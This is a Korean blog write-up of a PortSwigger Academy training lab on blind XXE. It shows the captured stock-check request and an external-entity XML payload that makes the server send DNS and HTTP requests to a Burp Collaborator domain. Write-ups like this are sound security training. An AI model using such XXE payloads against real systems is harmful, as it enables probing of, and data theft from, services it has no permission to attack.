---
layout: post
title: "Burp Academy 문제풀이 - Blind XXE with out-of-band interaction"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XXE]
toc: true
---

# 개요
- 블라인드 XXE 로 out-of-band 통신을 발생시키는 것을 실습하는 문제이다. 
- 문제 주소: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction
- 블라인드 XXE 설명 주소: https://portswigger.net/web-security/xxe/blind
- 난이도: PRACTITIONER (중간)

# 랩 개요  
- 이전 문제와 마찬가지로 "Check stock" 기능으로 XXE가 가능하다. 
- XXE로 문제 서버를 외부도메인과 통신하도록  (out-of-band interaction) 하는 것이  가능하다. 
- XXE를 통해 특정 DNS 요청을 발생시키면 될 것 같다. 
- DNS 요청이 발생했다는 것을 알기 위해서 Burp Collaborator 서버를 사용한다. 
- PortSwigger사의 [Burp Collaborator 설명](https://portswigger.net/burp/documentation/collaborator){:target="_blank"}을 보면 디폴트 Burp Collaborator 서버의 도메인은 `*.burpcollaborator.net` 또는  `*.oastify.com` 라는 것을 알 수 있다. 

```
This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
```

# 풀이 

## XXE 가능한 곳 발견
이전 문제들과 마찬가지로 "Check stock" 버튼 클릭시 발생하는 POST 요청의 바디 부분이 XML로 되어 있는 것을 발견했다. 

```http
POST /product/stock HTTP/1.1
Host: 0aa9007d0461bff2c00aaee6002e00b7.web-security-academy.net
Cookie: session=gBA3k6jT5f5DjHzCRpxVSxXg72sbIc5E
Content-Length: 107
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: https://0aa9007d0461bff2c00aaee6002e00b7.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa9007d0461bff2c00aaee6002e00b7.web-security-academy.net/product?productId=5
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ko;q=0.8
Connection: close

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>5</productId><storeId>1</storeId></stockCheck>
```

## Out-of-band 통신 발생 시도
HTTPS 요청 하는 대상을 burpcollaborator.net의 임의의 서브도메인 xxetest를 지정한 `xxetest.burpcollaborator.net` 로 지정해서 요청해보았다. 

```xml 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://xxetest.burpcollaborator.net"> ]>
<stockCheck>
	<productId>&xxe;</productId>
	<storeId>1</storeId>
</stockCheck>
```

응? `XML parsing error` 가 발생했다. XML 형식이 잘못된 건가?   
생각해보니 블라인드 XXE 문제이므로 XXE결과를 HTTP 응답에 포함시킬 필요는 없을 것 같다. 문제 서버가 외부로 DNS 요청을 하도록 만들기만 하면 되는 것이다. 

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 19

"XML parsing error"
```


여기서 웹 페이지를 보면 성공했다는 메세지가 보인다. 문제서버에서 burpcollaborator.net 도메인을 관리하는 DNS서버로 `xxetest.burpcollaborator.net` 도메인의 IP를 물어보는 DNS 쿼리가 발생한 것이다! 

![Blind XXE 성공](/images/burp-academy-xxe-3-success.png)

